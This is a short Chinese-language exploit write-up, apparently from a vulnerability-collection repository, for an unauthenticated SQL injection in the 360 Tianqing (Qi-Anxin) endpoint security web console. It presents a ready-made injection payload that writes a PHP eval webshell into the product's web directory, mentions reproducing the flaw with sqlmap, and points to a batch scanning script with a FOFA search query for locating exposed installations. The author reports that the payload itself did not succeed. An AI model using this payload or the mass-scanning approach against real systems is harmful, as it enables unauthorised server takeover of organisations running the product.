# 0x00 漏洞介绍
360天擎：一套终端安全管理系统，包括客户端、Web端，漏洞出现在Web端，一个可以未授权访问的API存在SQL注入漏洞，可导致写入Webshell，现在天擎系统归属奇安信，常称为奇安信天擎，官网：https://www.qianxin.com/product/detail/pid/49

# 0x01 复现环境
复现环境：内网环境  
复现版本：None  
环境搭建：  
无

# 0x02 利用条件
无

# 0x03 影响版本
暂无

# 0x04 漏洞复现
写入Webshell的payload如下：
```
/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('<?php @eval($_POST[1]);?>');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;--
```
不过并没有成功

我使用sqlmap进行复现，如下图  
![image](./pic/0.png)

# 0x05 批量脚本
用法：
```
python3 360天擎-SQL注入-Vuln-Batch-Detect.py -h
```
fofa语法：
```
app="360天擎终端安全管理系统"
```
效果如下  
![image](./pic/1.png)

# 0x06 参考链接
https://mp.weixin.qq.com/s/QqlueerhP0uVWWJNULhGvw
